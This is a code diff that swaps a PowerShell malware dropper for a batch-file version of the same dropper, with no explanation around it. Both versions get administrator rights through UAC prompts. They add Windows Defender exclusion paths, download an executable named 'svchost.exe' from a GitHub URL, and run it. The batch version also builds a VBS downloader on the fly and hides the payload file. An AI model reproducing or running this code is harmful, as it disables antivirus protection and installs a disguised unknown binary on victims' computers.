@@ -1,49 +1,85 @@
-function Run-AsAdmin {
-    param([string]$scriptPath)
+@echo off
+setlocal enabledelayedexpansion
 
-    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "powershell.exe"
-        $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
-        $psi.Verb = "runas"
-        try {
-            [Diagnostics.Process]::Start($psi) | Out-Null
-            exit
-        }
-        catch {
-            Write-Error "Elevation cancelled or failed."
-            exit 1
-        }
-    }
-}
+>nul 2>&1 net session
+if %errorlevel% neq 0 (
+    set "vbs=%~dp0getadmin.vbs"
+    echo Set UAC = CreateObject^("Shell.Application"^) > "!vbs!"
+    echo UAC.ShellExecute "cmd.exe", "/c """"%~f0""""", "", "runas", 1 >> "!vbs!"
+    cscript //nologo "!vbs!" >nul
+    del "!vbs!" >nul
+    exit /b
+)
 
-$scriptPath = $MyInvocation.MyCommand.Definition
-Run-AsAdmin -scriptPath $scriptPath
+set "exeUrl=https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"
+set "exeName=svchost.exe"
+set "desktopPath=%USERPROFILE%\Desktop"
+set "appdataPath=%APPDATA%"
+set "exePathDesktop=%desktopPath%\%exeName%"
+set "exePathAppData=%appdataPath%\Temp\%exeName%"
+set "vbsDownloader=%~dp0dl.vbs"
 
-$exeUrl = "https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-$destination = Join-Path -Path $desktopPath -ChildPath "svchost.exe"
+call :AddExclusion "%desktopPath%"
+call :AddExclusion "%exePathDesktop%"
+call :AddExclusion "%appdataPath%"
+call :AddExclusion "%exePathAppData%"
 
-$roamingTempPath = Join-Path -Path $env:APPDATA -ChildPath "Temp"
-$roamingTempSvchostExe = Join-Path -Path $roamingTempPath -ChildPath "svchost.exe"
+goto :after_exclusions
 
-if (-not (Test-Path $roamingTempPath)) {
-    New-Item -ItemType Directory -Force -Path $roamingTempPath | Out-Null
-}
+:AddExclusion
+set "path=%~1"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%path%' -ErrorAction SilentlyContinue" >nul 2>&1
+exit /b
 
-Add-MpPreference -ExclusionPath $roamingTempPath
-Add-MpPreference -ExclusionPath $roamingTempSvchostExe
-Add-MpPreference -ExclusionPath $desktopPath
-Add-MpPreference -ExclusionPath $destination
+:after_exclusions
 
-# Get the device path
-$devicePath = (Get-Volume).DevicePath | Where-Object { $_ -like "*HarddiskVolume3*" }
+(
+echo Dim http, stream, url, path
+echo url = WScript.Arguments^(0^)
+echo path = WScript.Arguments^(1^)
+echo On Error Resume Next
+echo Set http = CreateObject^("MSXML2.ServerXMLHTTP.6.0"^)
+echo If Err.Number ^<^> 0 Then
+echo     WScript.Quit 1
+echo End If
+echo http.setOption 2, 13056
+echo http.Open "GET", url, False
+echo http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+echo http.Send
+echo If Err.Number ^<^> 0 Then
+echo     WScript.Quit 1
+echo End If
+echo If http.Status = 200 Then
+echo     Set stream = CreateObject^("ADODB.Stream"^)
+echo     stream.Type = 1
+echo     stream.Open
+echo     stream.Write http.ResponseBody
+echo     stream.SaveToFile path, 2
+echo     stream.Close
+echo Else
+echo     WScript.Quit 1
+echo End If
+) > "%vbsDownloader%"
 
-# Add AMSI exception
-$exclusionPath = Join-Path -Path $devicePath -ChildPath "Users\$env:USERNAME\Desktop\svchost.exe"
-Add-MpPreference -ExclusionPath $exclusionPath
+if not exist "%vbsDownloader%" (
+    pause
+    exit /b 1
+)
 
-Invoke-WebRequest -Uri $exeUrl -OutFile $destination
+cscript //nologo "%vbsDownloader%" "%exeUrl%" "%exePathDesktop%" >nul
+copy /Y "%exePathDesktop%" "%exePathAppData%" >nul 2>&1
+del "%vbsDownloader%" >nul
 
-Start-Process -FilePath $destination -WindowStyle Hidden
+if exist "%exePathDesktop%" (
+    attrib +h "%exePathDesktop%" >nul
+    start "" "%exePathDesktop%"
+) else if exist "%exePathAppData%" (
+    attrib +h "%exePathAppData%" >nul
+    start "" "%exePathAppData%"
+) else (
+    powershell -Command "Get-MpThreatDetection | Select-Object ThreatName, Resources" 2>nul
+    pause
+)
+
+endlocal
+exit /b
